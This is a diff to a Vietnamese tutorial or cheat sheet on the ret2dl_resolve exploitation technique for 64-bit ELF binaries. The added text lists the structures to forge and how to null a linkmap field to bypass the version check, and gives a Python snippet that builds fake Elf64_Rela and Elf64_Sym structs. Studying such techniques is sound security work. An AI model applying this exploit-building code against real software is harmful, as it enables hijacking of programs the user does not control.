@@ -263,9 +263,49 @@ if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
 
 Cụ thể bạn có thể đọc kỹ hơn ở phần `The Exploit` của bài viết này [ret2dl_resolve](https://syst3mfailure.io/ret2dl_resolve) . Từ đó kết hợp với những lần khai thác lại mẫu của tôi `(tôi sẽ để cả hai trường hợp ở VD mẫu)` tôi chia `ret2dl_resolve` trên 64 bit ra hai trường hợp xử lý:
 
-      1) Vùng .bss được ánh xạ ở nơi có địa chỉ dạng `0x60xxxx` - Trường hợp này bạn cần hàm `write` hoặc hàm có chức năng tương tự từ libc để ghi đè (l->l_info[VERSYMIDX (DT_VERSYM)] == NULL) dẫn đến không thực thi đoạn mã `check version` nên không sinh ra lỗi.
+      1) Vùng .bss được ánh xạ ở nơi có địa chỉ dạng `0x60xxxx` - Trường hợp này bạn cần hàm `write` hoặc hàm có chức năng tương tự từ libc để leak giá trị của linkmap (GOT + 8) phục vụ việc ghi đè (l->l_info[VERSYMIDX (DT_VERSYM)] == NULL) dẫn đến không thực thi đoạn mã `check version` nên không sinh ra lỗi.
       
       2) Vùng .bss được ánh xạ nơi có địa chỉ dạng `0x40xxxx` - Trường hợp này khai thác như trên 32 bit khi mà mã nguồn chương trình cần khai thác chỉ có một hàm `read` từ libc và khi đó struct fake tại .bss không quá lớn dẫn đến lỗi `check version`.
+
+### Tóm lại cần fake 
+
+**1.** `Rela_offset` - Argument function `_dl_runtime_resolve` .
+
+**2.** `Elf64_Rela->r_info` - Fake struct Elf64_Rela .
+
+**3.** `Elf64_Sym->st_name` - Fake struct Elf64_Sym .
+
+**4.** Leak `linkmap` bằng hàm libc nếu có và ghi đè giá trị của `linkmap + 0x1d0` ( hoặc `linkmap + 0x1c8` tùy phiên bản libc ) thành NULL (TH: .bss => 0x60xxxx) .
+
+Để khai thác cần tính toán, lựa chọn vị trí và align phức tạp nữa nên một lần nữa tôi nhấn mạnh đây chỉ giống như `cheat sheet` => đọc và làm ví dụ tôi để trong mẫu 64 bit (có cả hai trường hợp).
+
+```python
+### FAKE INFO
+forged_area = base_stage + 40 # 64 - 8 * 3
+
+addr_rela = forged_area
+align_rela = 24 - ((addr_rela - JMPREL) % 24)
+addr_rela = addr_rela + align_rela
+
+addr_sym = addr_rela + 24
+align_sym = 24 - ((addr_sym - SYMTAB) % 24)
+addr_sym = addr_sym + align_sym
+
+log.info("Align rela: " + hex(align_rela))
+log.info("Align sym: " + hex(align_sym))
+
+addr_string = addr_sym + 24
+
+rela_offset = (addr_rela - JMPREL) // 24
+index_sym = (addr_sym - SYMTAB) // 24
+r_info = (index_sym << 32) | 0x7
+st_name = addr_string - STRTAB
+
+### FAKE STRUCT
+fake_rela_struct =  p64(read_got) + p64(r_info) + p64(0)
+
+fake_sym_struct = p32(st_name) + p32(0x12) + p64(0) + p64(0)
+```
 
 ---------------------------------------------------
 
